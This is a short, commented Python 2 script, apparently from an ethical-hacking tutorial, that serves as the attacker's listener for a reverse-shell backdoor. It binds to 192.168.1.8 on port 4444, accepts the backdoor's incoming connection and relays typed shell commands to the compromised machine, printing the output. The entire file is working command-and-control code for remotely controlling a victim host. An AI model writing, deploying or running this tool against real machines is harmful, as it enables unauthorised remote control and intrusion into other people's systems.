#!/usr/bin/python
import socket

# create a socket object  named listener
listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# modify an option so that we can reuse sockets
listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

# instead of connecting to a destination we binding our socket to our computer so that we listen for incoming connections on port 4444
listener.bind(("192.168.1.8", 4444))

# the number of connections that can be cued before the connections start getting refused
listener.listen(0)

print("[+] Waiting for incoming connections")

# accept the new connection socket object and the address bind to the socket you recieve the connection
# we capture the two variables that the listener.accept() generates
connection, address = listener.accept()

# inform the user from where the connection recieved
print("[+] Got a connection" + str(address))


while True:
    # ask the user for a command
    command = raw_input(">> ")
    # we send the command to the backdoor
    connection.send(command)
    # wait for the result (system pause for a sec) and stores the result into batches of 1024 bytes
    result = connection.recv(1024)
    # print the result
    print(result)
